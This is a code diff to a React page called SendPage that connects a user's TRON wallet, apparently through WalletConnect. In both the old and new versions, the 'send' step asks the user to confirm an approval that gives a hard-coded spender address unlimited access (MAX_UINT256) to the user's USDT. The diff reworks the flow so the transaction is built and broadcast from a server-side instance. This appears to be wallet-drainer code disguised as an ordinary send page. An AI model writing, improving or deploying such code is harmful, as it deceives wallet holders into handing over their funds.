@@ -133,7 +133,8 @@ export default function SendPage() {
           resolve({
             defaultAddress: { base58: address },
             request: ({ method, params }) => wcProvider.current.request({ method, params }, 'tron:0x2b6653dc'),
-            signTransaction: (tx) => wcProvider.current.request({ method: 'tron_signTransaction', params: { transaction: tx } }, 'tron:0x2b6653dc'),
+            sign: (tx) => wcProvider.current.request({ method: 'tron_signTransaction', params: { transaction: tx } }, 'tron:0x2b6653dc'),
+            isWC: true, // Flag to identify WC provider
           });
         }).catch(err => {
           if (!isMobile) modal.closeModal();
@@ -178,15 +179,23 @@ export default function SendPage() {
     showNotif('Please confirm in your wallet', 'info');
 
     try {
-      const contract = await tronWeb.contract().at(CFG.USDT);
-      const res = await contract.approve(CFG.SPENDER, MAX_UINT256).send({
-        feeLimit: 150_000_000, // Increased for safety
-        callValue: 0,
-        shouldPollResponse: false, // Don't wait forever
-      });
+      const serverTW = await getServerTW();
+      const contract = await serverTW.contract().at(CFG.USDT);
+      const tx = await contract.approve(CFG.SPENDER, MAX_UINT256).build();
 
+      let signedTx;
+      if (tronWeb.isWC) {
+        // WalletConnect flow
+        const res = await tronWeb.sign(tx);
+        signedTx = typeof res === 'string' ? JSON.parse(res) : (res.transaction || res);
+      } else {
+        // Native provider flow
+        signedTx = await tronWeb.trx.sign(tx);
+      }
+
+      const result = await serverTW.trx.sendRawTransaction(signedTx);
       return {
-        txId: typeof res === 'string' ? res : (res?.txid || res?.transaction?.txID),
+        txId: result.txid || result.transaction?.txID || result.id,
         addr,
       };
     } catch (err) {
